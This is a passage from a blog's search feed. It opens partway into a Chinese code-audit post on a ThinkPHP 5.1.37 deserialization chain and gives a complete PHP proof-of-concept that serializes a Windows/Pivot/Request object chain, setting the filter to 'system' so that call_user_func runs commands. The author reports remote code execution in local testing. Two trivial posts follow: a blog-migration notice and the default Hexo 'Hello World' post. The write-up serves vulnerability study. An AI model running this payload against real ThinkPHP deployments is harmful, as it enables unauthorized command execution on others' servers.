class><p>走到这里就调用了最终利用点call_user_func函数。这个filter我们可控，可以构造任意函数，这个value源于input的data数组，而data属性就源于param函数的$this-&gt;param属性。（不清楚的多看看这三个函数之间的调用）那么这里的filter和value属性我们都可控，我们就可以远程命令执行了。那么就开始编写最终版poc了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;li&quot;</span>=&gt;[]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;li&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$param</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>];<span class="comment">//对这个键名附上值</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;param = [<span class="string">&#x27;dir&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地测试，打出最终payload。</p><img src="/2023/01/31/thinkphp5-1-37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/33.png" class><p>成功执行rce，整条反序列化链到此结束。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>不知不觉写了两三个小时了，不说了，睡觉去，身体最重要。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客说明</title>
      <link href="/2023/01/30/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"/>
      <url>/2023/01/30/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<p>由原博客 <a href="https://blog.csdn.net/m0_62422842">https://blog.csdn.net/m0_62422842</a></p><p>迁移过来。只转移了部分文章，因为太过麻烦。以后会在此博客记录自己的学习经历。菜鸟一枚，欢迎师傅们来访</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/01/30/hello-world/"/>
      <url>/2023/01/30/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
